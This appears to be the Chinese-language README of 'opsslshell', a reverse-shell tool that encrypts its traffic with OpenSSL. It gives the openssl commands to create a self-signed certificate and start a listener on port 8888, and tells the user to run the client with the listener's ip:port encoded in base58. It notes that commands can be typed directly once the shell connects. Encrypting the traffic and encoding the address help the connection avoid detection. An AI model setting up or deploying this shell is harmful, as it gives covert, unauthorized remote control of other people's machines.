# opsslshell

使用openssl实现流量加密的反弹shell工具
### 使用方法
服务端使用如下命令生成key.pem和cert.pem
```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

然后开启监听
```
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
```

client端执行
```
main -t base58后的服务端ip:port
```
注意，shll反弹后没有连接成功的提示，直接执行命令即可。

